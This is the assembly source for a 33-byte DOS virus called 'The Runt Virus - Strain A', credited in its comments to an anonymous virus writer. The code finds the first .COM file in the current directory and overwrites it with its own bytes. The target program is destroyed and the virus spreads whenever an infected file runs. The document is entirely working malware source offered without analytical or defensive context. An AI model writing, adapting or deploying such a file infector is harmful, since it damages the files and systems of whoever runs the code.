

;-----------
; The Runt Virus - Strain A
;-----------------
;
;  Note: This virus far from complex.  Even ridiculus!
;        It was just my attempt to write the smallest
;        .COM infector (33 bytes) to the best of my
;        ability.
;
;             +------------------------------------------------+
;             | Written by a virus writer who wishes to remain |
;             | anonymous to prevent recognition.              |
;             +------------------------------------------------+

.model tiny
.code
org 100h

begin:
        lea     dx,com_files                    ; \
        mov     ah,4Eh                          ;  > Find *.COM
        int     21h                             ; /

        mov     ax,3D01h                        ; Open for write access.
        mov     cx,(offset eof-offset begin)    ; ..33 bytes to write..
        mov     dx,9eh                          ; 1st filename in DTA
        int     21h                             ;

        xchg    ax,bx                           ;
        mov     dx,100h                         ;
        mov     ah,40h                          ; DOS write service
        int     21h                             ;

        retn                                    ; Back to DOS

com_files       db      '*.COM',0               ; First .COM file in the
                                                ; current directory.
eof:
        end     begin


